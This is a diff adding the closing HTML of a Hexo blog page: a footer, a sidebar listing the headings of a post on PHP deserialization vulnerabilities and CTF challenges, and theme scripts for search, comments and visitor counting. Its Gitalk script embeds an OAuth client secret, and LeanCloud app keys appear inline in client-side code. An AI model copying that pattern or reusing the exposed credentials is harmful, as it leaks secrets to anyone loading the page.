+                <i class="fa fa-chevron-left"></i> 实验吧 Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/lufei.jpg" alt="P2hm1n">
+            
+              <p class="site-author-name" itemprop="name">P2hm1n</p>
+              <div class="site-description motion-element" itemprop="description">ONE PIECE</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/P2hm1n" title="GitHub &rarr; https://github.com/P2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="/qq7832919@gmail.com" title="E-Mail &rarr; qq7832919@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/p2hm1n" title="Twitter &rarr; https://twitter.com/p2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://threezh1.github.io/" title="https://threezh1.github.io/" rel="noopener" target="_blank">Threezh1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ku3n.github.io/" title="https://ku3n.github.io/" rel="noopener" target="_blank">ku3n</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#序列化与反序列化"><span class="nav-number">2.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么要进行序列化与反序列化？"><span class="nav-number">2.1.</span> <span class="nav-text">为什么要进行序列化与反序列化？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是序列化和反序列化？"><span class="nav-number">2.2.</span> <span class="nav-text">什么是序列化和反序列化？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化"><span class="nav-number">2.2.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化"><span class="nav-number">2.2.2.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么会产生反序列化漏洞？"><span class="nav-number">2.3.</span> <span class="nav-text">为什么会产生反序列化漏洞？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#很简单的栗子"><span class="nav-number">2.4.</span> <span class="nav-text">很简单的栗子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#D0g3平台"><span class="nav-number">2.4.1.</span> <span class="nav-text">D0g3平台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bugku-welcome-to-the-bugkuctf"><span class="nav-number">2.4.2.</span> <span class="nav-text">Bugku-welcome to the bugkuctf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些魔术方法"><span class="nav-number">2.5.</span> <span class="nav-text">一些魔术方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盘点近期两道有关反序列化题"><span class="nav-number">3.</span> <span class="nav-text">盘点近期两道有关反序列化题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第12届全国大学生信息安全竞赛-JustSoso"><span class="nav-number">3.1.</span> <span class="nav-text">第12届全国大学生信息安全竞赛-JustSoso</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DDCTF-Web签到题"><span class="nav-number">3.2.</span> <span class="nav-text">DDCTF-Web签到题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化还有什么？"><span class="nav-number">4.</span> <span class="nav-text">反序列化还有什么？</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P2hm1n</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">211k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">3:12</span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '355064866eb0a9c2de67',
+    clientSecret: '2e624255d41f832c93f2b3d8d828ecb1020eac9c',
+    repo: 'P2hm1n.github.io',
+    owner: 'P2hm1n',
+    admin: ['P2hm1n'],
+    id: md5(location.pathname),
+    
+      language: 'zh-CN',
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log('LeanCloud Counter Error: ' + responseJSON.code + ' ' + responseJSON.error);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'WtWopjB21xY5x2nLDalLtCkR-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'WtWopjB21xY5x2nLDalLtCkR-gzGzoHsz',
+                'X-LC-Key': 'IAjulOwXptsNYDpFKJrSDdq6',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+          $('#header').wobbleWindow({
+            radius: 50,
+            movementTop: false,
+            movementLeft: false,
+            movementRight: false,
+            debug: false,
+          });
+        
+
+        
+          $('#sidebar').wobbleWindow({
+            radius: 50,
+            movementLeft: false,
+            movementTop: false,
+            movementBottom: false,
+            position: 'fixed',
+            debug: false,
+          });
+        
+
+        
+          $('#footer').wobbleWindow({
+            radius: 50,
+            movementBottom: false,
+            movementLeft: false,
+            movementRight: false,
+            offsetX: ,
+            position: 'absolute',
+            debug: false,
+          });
+        
+      });
+    }
+  </script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script type="text/javascript" src="/js/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+</html>
